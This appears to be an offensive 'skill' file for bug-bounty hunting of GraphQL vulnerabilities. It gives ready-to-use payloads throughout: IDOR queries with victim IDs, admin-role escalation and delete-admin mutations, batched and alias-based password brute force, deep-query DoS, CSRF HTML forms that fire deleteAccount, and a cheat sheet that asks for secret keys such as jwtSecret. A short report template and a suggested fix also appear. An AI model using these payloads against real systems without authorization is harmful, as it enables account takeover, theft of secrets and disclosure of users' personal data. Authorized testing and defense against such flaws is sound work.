---
name: graphql
description: Hunt GraphQL-specific vulns — introspection abuse, field-level authorization (IDOR), batched queries for brute force, alias-based rate limit bypass, deep query DoS, mutation injection, schema disclosure, suggestion leakage, CSRF via GET, and CSRF via POST without preflight. Use when a GraphQL endpoint is present.
metadata:
  type: skill
  phase: hunt
  vuln_class: graphql
  tools: [graphw00f, clairvoyance, inql, graphql-cop, GraphQLmap]
---

# GraphQL Hunting

> One endpoint, infinite attack surface. The IDOR factory.

## When to invoke

**Trigger phrases:**
- "test GraphQL"
- "graphql introspection"
- "graphql IDOR"
- "find graphql"

## Detection

```bash
# Common GraphQL paths
for path in /graphql /graphiql /api/graphql /v1/graphql /v2/graphql /api/v3/graphql /query /api/query /__graphql /altair; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
    [[ "$code" != "404" ]] && echo "[$code] $path"
done

# Or use graphw00f
graphw00f -t https://target.com/graphql -d
# Identifies the GraphQL implementation (Apollo, Hasura, Graphene, etc.)
```

Common GraphQL paths (try all):
```
/graphql
/api/graphql
/v1/graphql
/v2/graphql
/query
/api/query
/graphql/v1
/graphqlv1
/altair
/graphiql
/graphiql.html
/__graphql
/api/2/graphql
/api/internal/graphql
/admin/graphql
```

## Step-by-Step Workflow

### 1. Detect & fingerprint engine

```bash
# graphw00f tells you which engine
graphw00f -t https://target.com/graphql -d

# Output:
# [+] Discovered Implementation: Apollo Server
```

Different engines have different bugs:

| Engine | Common bugs |
|---|---|
| Apollo Server | introspection on by default in dev, no depth limit by default |
| Hasura | direct DB access if misconfigured, JWT secret leakage |
| Graphene (Python) | schema disclosure, no rate limit |
| GraphQL Yoga | depth/breadth attacks |
| AWS AppSync | resolver IAM issues |
| Sangria (Scala) | introspection, query complexity |

### 2. Introspection — get the schema

If introspection is on, you get the full API map:

```bash
# Manual
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"query{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}"}'

# Or full introspection (use the standard query)
cat > introspection.json <<'EOF'
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
EOF
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d @introspection.json | jq . > schema.json

# View with GraphQL Voyager (https://ivangoncharov.github.io/graphql-voyager/)
# Or convert to SDL with graphql-cli
```

### 3. If introspection disabled — use clairvoyance

```bash
git clone https://github.com/nikitastupin/clairvoyance
cd clairvoyance
pip install -r requirements.txt

# Brute-force schema using suggestion leakage
python3 -m clairvoyance \
    -u https://target.com/graphql \
    -o schema.json \
    -w ~/tools/SecLists/Discovery/Web-Content/graphql.txt
```

Some engines respond to "did you mean X" suggestions on bad queries — clairvoyance exploits this.

### 4. Field-level IDOR (the most common GraphQL bug)

GraphQL fields are often auth-checked at the **top level** but not at **nested fields**.

```graphql
# May work even when /api/user/{id} is forbidden
{
  user(id: "VICTIM_ID") {
    email
    phoneNumber
    paymentMethods { last4 }
    notifications { content }
  }
}

# Try every "lookup-by-id" field on every type
{ project(id: "X") { ... } }
{ order(id: "X") { ... } }
{ document(id: "X") { ... } }
{ organization(id: "X") { members { email } } }
```

Map all `Query.*ById` from the schema, throw victim IDs at each.

### 5. Mutation-based attacks

```graphql
# Promote yourself to admin (if `role` is mutable)
mutation { updateUser(id: "MY_ID", input: { role: "admin" }) { id role } }

# Update someone else's profile
mutation { updateUser(id: "VICTIM_ID", input: { email: "attacker@x.com" }) { id email } }

# Delete admin
mutation { deleteUser(id: "ADMIN_ID") { success } }

# Spam endpoint via batched mutation
[
  {"query": "mutation { sendEmail(to: \"v1@x.com\") { id } }"},
  {"query": "mutation { sendEmail(to: \"v2@x.com\") { id } }"},
  ...
]
```

### 6. Batched queries for brute-force / rate-limit bypass

```graphql
[
  {"query": "mutation { login(email: \"victim@x.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"victim@x.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"victim@x.com\", password: \"pass3\") { token } }"},
  ...
]
```

Many GraphQL servers rate-limit on **request count**, not **operation count**. 1 request, 1000 operations = bypass.

### 7. Alias-based brute force

```graphql
mutation {
  a1: login(email: "victim@x.com", password: "pass1") { token }
  a2: login(email: "victim@x.com", password: "pass2") { token }
  a3: login(email: "victim@x.com", password: "pass3") { token }
  # ...
}
```

Same: one HTTP request, many login attempts.

### 8. Deep query DoS

```graphql
{
  user(id: "X") {
    posts {
      author {
        posts {
          author {
            posts {
              # ... 50 levels deep
            }
          }
        }
      }
    }
  }
}
```

If no depth limit → server spends CPU/memory. (Don't actually DoS production — note as theoretical or report with controlled test.)

### 9. Field suggestion leakage

```graphql
{ userr(id: "x") { id } }      # typo `userr`
# Response: "Did you mean 'user'?"
```

Even with introspection off, suggestions leak schema. Document these as info leak.

### 10. Authorization bypass via aliases

Some apps log/audit `loginUser` operations. Renaming via alias evades:

```graphql
mutation {
  notReallyLogin: loginUser(email: "victim@x.com", password: "x") { token }
}
```

Same operation, different "name" in logs.

### 11. CSRF via GET (GraphQL over GET)

Most GraphQL clients POST. But some servers also accept GET — vulnerable to CSRF since browsers send credentials.

```html
<img src="https://target.com/graphql?query=mutation+%7BdeleteAccount%7D">
```

### 12. CSRF via POST without preflight

If the GraphQL endpoint accepts `Content-Type: application/x-www-form-urlencoded` or `text/plain`, no CORS preflight triggers:

```html
<form method="POST" action="https://target.com/graphql" enctype="text/plain">
  <input name='{"query":"mutation{deleteAccount}"}' value="">
</form>
```

### 13. Tools

```bash
# inql (Burp extension + standalone)
# Captures GraphQL → renders schema → generates queries

# graphql-cop (security testing)
git clone https://github.com/dolevf/graphql-cop
python3 graphql-cop.py -t https://target.com/graphql

# GraphQLmap (interactive shell)
python3 GraphQLmap.py -u https://target.com/graphql
```

## Quick offense queries cheat

```graphql
# Schema dump (introspection)
{__schema{queryType{name},mutationType{name},types{name,kind,fields{name,type{name,kind}}}}}

# Field probing for IDOR
{user(id:"BBBB"){id,email,role}}
{order(id:"BBBB"){id,total,user{id,email}}}
{organization(id:"BBBB"){id,members{email,role}}}

# Privilege escalation via mutation
mutation{updateUser(id:"MY_ID",input:{role:"admin"}){role}}
mutation{updateRole(userId:"MY_ID",role:"admin"){success}}

# Information disclosure via fields
{me{id,email,role,tenant{id},apiKeys{key},stripeId}}

# Hidden admin queries
{adminUsers{id,email}}
{internalConfig{stripeSecretKey,jwtSecret}}
```

## Output template

```markdown
## Critical: IDOR in GraphQL `user` field → bulk email/PII disclosure

### Summary
The `user(id: ID!)` query in the GraphQL schema does not enforce object-level authorization. Any authenticated user can read other users' email, phone number, address, and payment method last-4 digits by querying by ID.

### Steps to reproduce
1. Log in as Account A (your own account)
2. Capture the GraphQL endpoint's `Authorization` header
3. Send this query against `POST https://target.com/api/graphql`:
   ```http
   Authorization: Bearer A_TOKEN
   Content-Type: application/json

   {"query":"{ user(id:\"BBBB-VICTIM-ID\"){ id email phoneNumber address paymentMethods{ last4 brand } } }"}
   ```
4. Response:
   ```json
   {
     "data": {
       "user": {
         "id": "BBBB-VICTIM-ID",
         "email": "victim@example.com",
         "phoneNumber": "+1-555-1234",
         "address": "123 Main St, Anytown, USA",
         "paymentMethods": [{"last4":"4242","brand":"visa"}]
       }
     }
   }
   ```

### Impact
- Any authenticated user can enumerate all 2M+ user accounts by iterating IDs
- PII disclosed: email, phone, address, payment method
- Phone + email enables credential stuffing / SIM swap targeting
- GDPR/CCPA compliance impact

### Suggested fix
- Add authorization check at the `user` resolver: `if (request.user.id !== id && !request.user.isAdmin) throw ForbiddenError`
- Audit all `Query.*ById` resolvers for similar issues
```

## Cross-references

- `[[idor-hunting]]` — GraphQL is the world's biggest IDOR factory
- `[[content-discovery]]` — find /graphql endpoints
- `[[auth-bypass]]` — GraphQL auth bypass tricks
- `[[js-analysis]]` — embedded GraphQL queries in JS

## Common pitfalls

1. **Treating introspection-disabled as "safe".** Use clairvoyance to recover schema.
2. **Reporting introspection alone.** Most programs treat it as informative unless paired with another bug.
3. **DoSing with deep queries on production.** Just don't. Report as theoretical with limited PoC.
4. **Missing alias-based brute force.** This is a quiet pay class.
5. **Not testing mutations as much as queries.** Mutations = highest-impact bugs.

## graphw00f → engine-specific guide

```bash
graphw00f -t https://target.com/graphql -d
# Engine: Apollo Server

# Now check known Apollo bugs:
# - Introspection in production?
# - Apollo Studio enabled?
# - Resolver-level auth bypass?
# - Cache poisoning on persisted queries?
```

For each engine, see `docs/tool-cheatsheets/graphql-engines.md`.

## "Should I report introspection?"

| Context | Submit? |
|---|---|
| Introspection enabled on prod + schema reveals admin queries | Yes (low/med info) |
| Introspection enabled + you found IDOR using it | Yes — chain |
| Introspection enabled but only basic queries | Most programs reject as informative |
| Introspection enabled on dev env (e.g., `dev.target.com`) | Usually informative |

## Burp extension setup

Install **InQL** from BApp Store. It:
- Sends introspection queries automatically
- Decodes GraphQL POST bodies (otherwise they're just JSON blobs)
- Generates one-click "send each query as test" templates
- Integrates with Repeater for fast probing
